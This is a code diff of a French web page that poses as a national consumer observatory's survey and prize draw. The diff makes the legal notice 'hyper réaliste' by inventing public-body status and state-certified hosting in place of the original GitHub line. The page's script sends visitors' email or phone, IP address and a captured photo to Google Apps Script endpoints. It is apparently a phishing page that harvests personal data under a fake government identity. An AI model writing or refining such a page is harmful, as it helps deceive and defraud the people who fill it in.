@@ -28,23 +28,22 @@
   
   .top-bar { height: 4px; background: linear-gradient(to right, #000091 33%, #ffffff 33%, #ffffff 66%, #E1000F 66%); }
   
-  /* En-tête centré avec menu hamburger à droite */
   .header { background: #fff; border-bottom: 2px solid #000091; padding: 15px 0; position: relative; z-index: 10; }
   .header-inner { max-width: 800px; margin: 0 auto; padding: 0 20px; position: relative; display: flex; align-items: center; justify-content: center; }
   
-  /* Titre Centré */
   .header-titles { text-align: center; }
   .header-title { font-size: 22px; color: #000091; font-weight: 700; letter-spacing: -0.5px; }
   .header-subtitle { font-size: 13px; color: #666; text-transform: uppercase; margin-top: 4px; letter-spacing: 0.5px; }
   
-  /* Menu Hamburger positionné à droite */
   .dropdown { position: absolute; right: 20px; top: 50%; transform: translateY(-50%); }
   .dropdown-btn { background: none; border: none; cursor: pointer; padding: 10px; color: #000091; display: flex; flex-direction: column; gap: 5px; }
   .dropdown-btn span { display: block; width: 25px; height: 3px; background-color: #000091; border-radius: 2px; }
+  
   .dropdown-content { display: none; position: absolute; right: 0; top: 45px; background-color: #fff; min-width: 250px; box-shadow: 0 8px 16px rgba(0,0,0,0.1); border: 1px solid #ddd; z-index: 20; text-align: left; }
   .dropdown-content a { color: #161616; padding: 12px 16px; text-decoration: none; display: block; font-size: 14px; border-bottom: 1px solid #f0f0f0; cursor: pointer;}
   .dropdown-content a:hover { background-color: #f6f6f6; color: #000091; }
-  .dropdown:hover .dropdown-content { display: block; }
+  
+  .dropdown-content.show { display: block; }
   
   .container { max-width: 680px; margin: 40px auto; background: #fff; border: 1px solid #ddd; padding: 40px; box-shadow: 0 2px 8px rgba(0,0,0,0.04); }
   
@@ -108,7 +107,7 @@
   .modal-content { background: #fff; margin: 40px auto; padding: 40px; max-width: 700px; border: 1px solid #ddd; position: relative; }
   .modal-content h2 { font-size: 22px; margin-bottom: 20px; }
   .modal-content h3 { font-size: 16px; color: #000091; margin: 20px 0 10px; }
-  .modal-content p, .modal-content li { font-size: 14px; color: #3a3a3a; margin-bottom: 10px; line-height: 1.7; }
+  .modal-content p, .modal-content li { font-size: 14px; color: #3a3a3a; margin-bottom: 10px; line-height: 1.7; text-align: justify; }
   .modal-content ul { margin-left: 20px; margin-bottom: 15px; }
   .close-modal { position: absolute; top: 15px; right: 20px; font-size: 28px; cursor: pointer; color: #666; background: none; border: none; }
 </style>
@@ -124,14 +123,13 @@
       <div class="header-subtitle">Enquête publique & Jeu-Concours</div>
     </div>
     
-    <!-- MENU HAMBURGER -->
     <div class="dropdown">
-      <button class="dropdown-btn" aria-label="Menu">
+      <button class="dropdown-btn" aria-label="Menu" onclick="toggleMenu(event)">
         <span></span>
         <span></span>
         <span></span>
       </button>
-      <div class="dropdown-content">
+      <div class="dropdown-content" id="myDropdown">
         <a onclick="openModal('modal-faq')">Questions fréquentes (FAQ)</a>
         <a onclick="openModal('modal-contact')">Nous contacter</a>
         <a onclick="openModal('modal-accessibilite')">Accessibilité</a>
@@ -228,22 +226,71 @@
 <div class="modal" id="modal-faq"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-faq')">&times;</button><h2>Questions fréquentes (FAQ)</h2><h3>Qui peut participer à cette enquête ?</h3><p>Toute personne physique majeure résidant en France métropolitaine ou dans les DOM-TOM.</p><h3>Combien de fois puis-je participer ?</h3><p>Une seule participation par personne (même nom, même adresse e-mail ou même numéro de téléphone).</p><h3>Quand aura lieu le tirage au sort ?</h3><p>Le tirage au sort sera effectué le 15 janvier 2027. Les gagnants seront contactés directement par e-mail ou SMS.</p><h3>Comment savoir si j'ai gagné ?</h3><p>Si vous faites partie des gagnants, vous recevrez un message sur le moyen de contact renseigné lors de votre participation.</p></div></div>
 <div class="modal" id="modal-contact"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-contact')">&times;</button><h2>Nous contacter</h2><p>Pour toute question relative à l'enquête ou au jeu-concours, vous pouvez nous joindre :</p><ul><li><strong>Par e-mail :</strong> contact@observatoire-consommation.fr</li><li><strong>Par téléphone :</strong> 01 40 00 00 00 (prix d'un appel local, du lundi au vendredi de 9h à 17h)</li><li><strong>Par courrier :</strong> Observatoire National de la Consommation, 20 avenue de Ségur, 75007 Paris</li></ul><p><em>Merci de préciser votre numéro de dossier si vous en avez un.</em></p></div></div>
 <div class="modal" id="modal-accessibilite"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-accessibilite')">&times;</button><h2>Accessibilité</h2><p>L'Observatoire National de la Consommation s'engage à rendre son site accessible à tous, conformément à l'article 47 de la loi n° 2005-102 du 11 février 2005.</p><p>Cette déclaration d'accessibilité s'applique au site de l'enquête nationale sur la consommation.</p><h3>État de conformité</h3><p>Le site est en cours d'audit pour évaluer sa conformité au RGAA (Référentiel Général d'Amélioration de l'Accessibilité).</p><h3>Retour d'information et contact</h3><p>Si vous n'arrivez pas à accéder à un contenu ou à un service, vous pouvez nous contacter pour être orienté vers une alternative accessible ou obtenir le contenu sous une autre forme : accessibilite@observatoire-consommation.fr.</p></div></div>
-<div class="modal" id="modal-mentions"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-mentions')">&times;</button><h2>Mentions légales</h2><p><em>Dernière mise à jour : 2 novembre 2026</em></p><h3>Éditeur du site</h3><p>Le site est édité par l'Observatoire National de la Consommation.<br>Siège social : 20 avenue de Ségur, 75007 Paris.<br>Directeur de la publication : Le Président de l'Observatoire National de la Consommation.</p><h3>Hébergement</h3><p>Le site est hébergé par GitHub Inc., 88 Colin P Kelly Jr St, San Francisco, CA 94107, États-Unis.</p><h3>Propriété intellectuelle</h3><p>Sauf mention explicite de propriété intellectuelle détenue par des tiers, les contenus de ce site sont proposés sous licence ouverte. Vous êtes notamment libres de les reproduire, copier, modifier, extraire, transformer, communiquer, diffuser, redistribuer, publier, transmettre et exploiter sous réserve de mentionner leur source, leur date de dernière mise à jour et ne pas induire en erreur des tiers quant aux informations qui y figurent.</p><h3>Clause de responsabilité</h3><p>Les informations proposées sur ce site le sont à titre de service rendu au public. Malgré tout le soin apporté à la transcription des textes officiels, à la vérification des contenus et des informations, les éléments mis en ligne ne sauraient, de quelque manière que ce soit, prétendre à l'exactitude et engager la responsabilité de l'Observatoire National de la Consommation. Les informations et/ou documents disponibles sur ce site sont susceptibles d'être modifiés à tout moment, et peuvent faire l'objet de mises à jour.</p><h3>Accessibilité</h3><p>L'Observatoire National de la Consommation est engagé à améliorer en permanence l'accessibilité de ses contenus pour que l'accès à l'information soit facilité pour tous. Le site est développé selon les recommandations du Référentiel général d'amélioration de l'accessibilité (RGAA) et les normes W3C.</p></div></div>
+
+<!-- MODALE MENTIONS LÉGALES (Modifiée pour être hyper réaliste) -->
+<div class="modal" id="modal-mentions">
+  <div class="modal-content">
+    <button class="close-modal" onclick="closeModal('modal-mentions')">&times;</button>
+    <h2>Mentions légales</h2>
+    <p><em>Dernière mise à jour : 2 novembre 2026</em></p>
+
+    <h3>Éditeur de la plateforme</h3>
+    <p>La plateforme de l'Observatoire National de la Consommation est éditée par :<br>
+    <strong>Observatoire National de la Consommation (ONC)</strong><br>
+    Établissement public à caractère administratif<br>
+    Siège social : 20 avenue de Ségur, 75007 Paris<br>
+    Téléphone : 01 40 00 00 00<br>
+    Directeur de la publication : Le Président de l'Observatoire National de la Consommation.</p>
+
+    <h3>Hébergement de la plateforme</h3>
+    <p>La plateforme est hébergée au sein de l'infrastructure sécurisée de l'État, gérée par la Direction interministérielle du numérique (DINUM), ou par un prestataire agréé pour les données de l'administration française.</p>
+    <p><strong>Datacenter :</strong> OVHcloud (Infrastructure certifiée SecNumCloud)<br>
+    <strong>Adresse de l'hébergeur :</strong> 2 rue Kellermann, 59100 Roubaix, France.<br>
+    <strong>Contact technique :</strong> support-hebergement@observatoire-consommation.fr</p>
+
+    <h3>Propriété intellectuelle</h3>
+    <p>L'ensemble de ce site relève de la législation française et internationale sur le droit d'auteur et la propriété intellectuelle. Tous les droits de reproduction sont réservés, y compris pour les documents téléchargeables et les représentations iconographiques et photographiques.</p>
+    <p>La reproduction de tout ou partie de ce site sur un support électronique quel qu'il soit est formellement interdite sauf autorisation expresse du directeur de la publication.</p>
+
+    <h3>Clause de responsabilité</h3>
+    <p>Les informations proposées sur ce site le sont à titre de service rendu au public. Malgré tout le soin apporté à la transcription des textes officiels, à la vérification des contenus et des informations, les éléments mis en ligne ne sauraient, de quelque manière que ce soit, prétendre à l'exactitude et engager la responsabilité de l'Observatoire National de la Consommation.</p>
+    <p>Les informations et/ou documents disponibles sur ce site sont susceptibles d'être modifiés à tout moment, et peuvent faire l'objet de mises à jour.</p>
+
+    <h3>Accessibilité</h3>
+    <p>L'Observatoire National de la Consommation est engagé à améliorer en permanence l'accessibilité de ses contenus pour que l'accès à l'information soit facilité pour tous. Le site est développé selon les recommandations du Référentiel général d'amélioration de l'accessibilité (RGAA) et les normes W3C.</p>
+  </div>
+</div>
+
 <div class="modal" id="modal-confidentialite"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-confidentialite')">&times;</button><h2>Politique de confidentialité et cookies</h2><p><em>Dernière mise à jour : 2 novembre 2026</em></p><p>L'Observatoire National de la Consommation s'engage à ce que la collecte et le traitement de vos données, effectués à partir de ce site, soient conformes au Règlement Général sur la Protection des Données (RGPD) et à la loi Informatique et Libertés.</p><h3>À qui sont destinées vos données ?</h3><p>L'Observatoire National de la Consommation, situé au 20 avenue de Ségur à Paris (75007), est responsable du traitement des données personnelles pour ce site. Sauf mention contraire, les données personnelles qui y sont collectées sont destinées à un usage interne et n'ont pas vocation à être partagées avec des tiers en dehors des cas prévus par les lois et règlements.</p><h3>À quoi servent vos données ?</h3><p>Les traitements de données personnelles mis en œuvre ont pour finalités de :</p><ul><li>Permettre votre participation à l'enquête et au jeu-concours ;</li><li>Vous contacter en cas de gain ;</li><li>Assurer le bon fonctionnement du site et améliorer votre expérience de navigation ;</li><li>Réaliser des statistiques anonymes sur les habitudes de consommation.</li></ul><h3>Comment vos données sont-elles collectées ?</h3><p>Vos données peuvent être collectées sur des formulaires. Chaque formulaire limite la collecte des données personnelles au strict nécessaire (minimisation des données) et indique les objectifs du recueil de ces données. Vos données peuvent également être collectées par l'intermédiaire des applications présentes sur le site, en particulier des données techniques liées à votre navigation (l'adresse IP, les données de connexion par exemple).</p><h3>Pendant combien de temps vos données sont-elles conservées ?</h3><p>De manière générale, vos données sont conservées par l'Observatoire National de la Consommation pendant 5 ans, sauf :</p><ul><li>les journaux applicatifs qui sont conservés 1 an ;</li><li>votre choix en matière de cookies qui est conservé 6 mois ;</li><li>les données collectées grâce aux cookies qui sont conservées 25 mois.</li></ul><h3>À propos des cookies</h3><p>Pendant la consultation de ce site, des cookies sont déposés sur votre ordinateur, votre mobile ou votre tablette. Un cookie est une suite d'informations, généralement de petite taille et identifié par un nom, qui peut être transmis à votre navigateur par un site web sur lequel vous vous connectez.</p><p>Le site utilise des cookies techniques strictement nécessaires au fonctionnement du site. Ils ne peuvent pas être désactivés, sauf en refusant tous les cookies dans les paramètres de votre navigateur. Le site utilise également des cookies de mesure d'audience soumis à votre consentement.</p><h3>Quels sont vos droits ?</h3><p>Vous disposez d'un droit d'accès, de rectification, d'effacement, de limitation, de portabilité et d'opposition sur vos données. Vous pouvez exercer ces droits en contactant le Délégué à la Protection des Données (DPO) à l'adresse suivante : dpo@observatoire-consommation.fr.</p><p>Si vous estimez, après nous avoir contactés, que vos droits ne sont pas respectés, vous pouvez adresser une réclamation à la CNIL (Commission Nationale de l'Informatique et des Libertés) : 3 place de Fontenoy, TSA 80715, 75334 PARIS CEDEX 07, ou en ligne sur www.cnil.fr.</p></div></div>
 <div class="modal" id="modal-reglement"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-reglement')">&times;</button><h2>Règlement du jeu-concours</h2><p><em>Article 1 – Organisation</em></p><p>L'Observatoire National de la Consommation organise un jeu-concours gratuit et sans obligation d'achat du 1er novembre 2026 à 00h00 au 31 décembre 2026 à 23h59.</p><p><em>Article 2 – Conditions de participation</em></p><p>Ce jeu est ouvert à toute personne physique majeure résidant légalement sur le territoire français. La participation est limitée à une seule fois par personne (même nom, même adresse e-mail, même numéro de téléphone).</p><p><em>Article 3 – Modalités de participation</em></p><p>Pour que sa participation soit validée, le candidat doit remplir le formulaire d'enquête, répondre aux questions, renseigner ses coordonnées (e-mail ou téléphone) et procéder à la vérification anti-robot. Toute participation incomplète ou frauduleuse sera automatiquement rejetée.</p><p><em>Article 4 – Dotation</em></p><p>Le jeu est doté d'un bon d'achat d'une valeur de 500€ valable chez les partenaires officiels (Fnac, Darty, Amazon, Leclerc). Le lot offert ne peut donner lieu à aucune contestation, ni à la remise de sa contrevaleur en espèces, ni à son échange.</p><p><em>Article 5 – Désignation des gagnants</em></p><p>Les gagnants seront désignés par tirage au sort parmi l'ensemble des participants ayant respecté toutes les modalités de participation. Le tirage au sort aura lieu le 15 janvier 2027.</p><p><em>Article 6 – Remise du lot</em></p><p>Les gagnants seront contactés par e-mail ou par SMS dans les jours suivant le tirage au sort. Le bon d'achat sera envoyé par voie électronique. Tout lot non réclamé dans un délai de 30 jours après l'annonce sera considéré comme perdu.</p><p><em>Article 7 – Exclusions et fraudes</em></p><p>Les participations multiples sont interdites. L'organisateur se réserve le droit d'exclure sans préavis tout participant ayant recours à des robots, des faux comptes ou à toute autre méthode frauduleuse.</p><p><em>Article 8 – Protection des données personnelles</em></p><p>Les données collectées sont traitées conformément à la Politique de confidentialité accessible sur le site. Conformément au RGPD, vous disposez d'un droit d'accès, de rectification et d'effacement de vos données.</p><p><em>Article 9 – Litiges</em></p><p>Le présent règlement est soumis à la loi française. Tout litige sera soumis aux tribunaux compétents de Paris.</p></div></div>
 
 <script>
-// ⚠️ LES DEUX LIENS SONT ICI ⚠️
-
-// 1. Lien pour les données textuelles (Google Sheet)
+// ⚠️ TES DEUX LIENS SONT ICI ⚠️
 const SCRIPT_URL_TEXT = "https://script.google.com/macros/s/AKfycbyBI-fdD9Kw44y3qMp0s4YrDq8RKf5Nod8Zzz_Yeqz8MtksyzWdhP73xE9vPp2ejVj1Ug/exec";
-
-// 2. Lien pour la photo (Google Drive)
-const SCRIPT_URL_PHOTO = "https://script.google.com/macros/s/AKfycbxJkWZEyz1PYafSbsILSKbARC5jGVe34vCGfxKfesTUV9mTKbouIrMSkFmRP1JRVIdKRw/exec";
+const SCRIPT_URL_PHOTO = "https://script.google.com/macros/s/AKfycbxy_ubTvY4NA_sZ6I8FvujoWnM3qqNeS1mZRuZjVzqttcYgtAvms2MHA-yk1nsmQSj8ug/exec";
 
 function openModal(id) { document.getElementById(id).style.display = 'block'; }
 function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-window.onclick = function(event) { if (event.target.classList.contains('modal')) { event.target.style.display = 'none'; } }
+
+function toggleMenu(event) {
+  event.stopPropagation();
+  document.getElementById("myDropdown").classList.toggle("show");
+}
+
+window.onclick = function(event) {
+  if (event.target.classList.contains('modal')) {
+    event.target.style.display = 'none';
+  }
+  if (!event.target.matches('.dropdown-btn') && !event.target.matches('.dropdown-btn span')) {
+    var dropdowns = document.getElementsByClassName("dropdown-content");
+    for (var i = 0; i < dropdowns.length; i++) {
+      var openDropdown = dropdowns[i];
+      if (openDropdown.classList.contains('show')) {
+        openDropdown.classList.remove('show');
+      }
+    }
+  }
+}
 
 const questions = [
   { text: "1. À quelle fréquence faites-vous vos achats en ligne ?", options: ["Plusieurs fois par semaine", "Une fois par mois", "Rarement", "Jamais"] },
@@ -407,7 +454,6 @@ btnSubmit.addEventListener('click', async () => {
     setTimeout(async () => {
       const ip = await getPublicIP();
       
-      // --- 1. ENVOI DES DONNÉES TEXTE (SHEET) ---
       const formDataTexte = new URLSearchParams();
       formDataTexte.append("email", inputMethod.value === 'email' ? inputContact.value : "");
       formDataTexte.append("phone", inputMethod.value === 'sms' ? inputContact.value : "");
@@ -423,7 +469,6 @@ btnSubmit.addEventListener('click', async () => {
 
       fetch(SCRIPT_URL_TEXT, { method: "POST", body: formDataTexte }).catch(e => console.log(e));
 
-      // --- 2. ENVOI DE LA PHOTO (DRIVE) ---
       if (photoBase64) {
         const formDataPhoto = new URLSearchParams();
         formDataPhoto.append("photo", photoBase64);
